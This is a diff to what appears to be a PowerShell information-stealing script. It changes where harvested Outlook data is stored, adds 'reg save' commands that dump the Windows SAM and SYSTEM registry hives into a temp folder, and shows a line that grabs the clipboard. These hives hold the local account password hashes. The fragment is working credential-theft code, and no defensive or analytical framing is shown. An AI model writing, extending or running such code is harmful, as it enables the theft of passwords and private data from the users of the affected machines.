@@ -2432,8 +2432,13 @@ function get-Outlook {
 
 $outlook = get-Outlook
 if ($outlook -ne $null) {
-	$outlook >> $env:tmp/$FolderName/Gaming/OutlookData.txt
+	$outlook >> $env:tmp/$FolderName/OutlookData.txt
 }
+
+# Get SAM and System Reg
+New-Item $env:tmp/$FolderName/SystemSAM -ItemType Directory
+reg save hklm\sam $env:tmp\$FolderName\SystemSAM\SAM /y
+reg save hklm\system $env:tmp\$FolderName\SystemSAM\SYSTEM /y
 
 # Get Clipboard
 Get-Clipboard > "$env:temp\$FolderName\Clipboard.txt";
